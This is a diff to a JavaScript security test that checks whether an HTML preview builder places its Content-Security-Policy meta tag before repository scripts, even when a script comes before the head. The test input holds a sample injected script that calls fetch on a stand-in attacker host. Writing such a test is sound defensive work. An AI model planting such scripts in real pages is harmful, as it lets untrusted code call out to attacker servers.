@@ -87,4 +87,14 @@ assert.ok(
     'child CSP is not placed before repository script execution'
 );
 
+const earlyScriptHtml = '<script>fetch(\"https://evil.example/early\")</script><html><head><title>x</title></head><body>ok</body></html>';
+const earlyWrapper = buildHtmlPreviewDocument(earlyScriptHtml);
+const earlyEncoded = earlyWrapper.match(/src=\"data:text\/html;base64,([^\"]+)\"/i)?.[1];
+assert.ok(earlyEncoded, 'preview did not encode early-script test document');
+const earlyInner = Buffer.from(earlyEncoded, 'base64').toString('utf8');
+assert.ok(
+    earlyInner.indexOf('<meta http-equiv="Content-Security-Policy"') < earlyInner.indexOf('<script>'),
+    'child CSP must precede repository scripts even when repository HTML places <script> before <head>'
+);
+
 console.log('preview-navigation-security: PASS');
